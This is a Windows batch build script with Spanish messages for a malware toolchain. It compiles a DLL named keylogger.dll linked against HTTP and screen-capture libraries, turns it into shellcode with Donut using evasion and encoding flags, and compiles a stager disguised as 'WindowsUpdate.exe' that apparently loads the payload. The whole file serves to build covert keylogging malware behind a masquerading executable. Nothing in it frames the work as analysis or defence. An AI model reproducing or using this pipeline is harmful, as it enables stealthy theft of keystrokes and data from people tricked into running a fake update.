@echo off
setlocal

echo ============================================
echo  [1/3] Compilando keylogger.dll (x64)...
echo ============================================
cl /nologo /MD /O2 /GS- /EHs-c- /DNDEBUG /std:c++14 ^
   /LD kl.cpp ^
   /Fe:keylogger.dll ^
   /Fo:obj\ ^
   /link user32.lib gdi32.lib gdiplus.lib winhttp.lib shlwapi.lib ole32.lib advapi32.lib

if errorlevel 1 (echo [X] ERROR compilando DLL. & exit /b 1)

echo.
echo ============================================
echo  [2/3] Generando shellcode con Donut...
echo ============================================
if not exist donut.exe (echo [!] donut.exe no esta. Saltando. & goto :skipDonut)

donut.exe -i keylogger.dll -o image.bin -a 2 -m Go -b 1 -e 1 -z 1
if errorlevel 1 (echo [X] Donut fallo. & exit /b 1)

:skipDonut
echo.
echo ============================================
echo  [3/3] Compilando stager (WindowsUpdate.exe)...
echo ============================================
cl /nologo /MT /O2 /EHa stager.cpp ^
   /Fe:WindowsUpdate.exe ^
   /link winhttp.lib user32.lib shell32.lib advapi32.lib

if errorlevel 1 (echo [X] ERROR compilando stager. & exit /b 1)

echo.
echo ============================================
echo  LISTO
echo ============================================
dir /b *.dll *.bin *.exe 2>nul
endlocal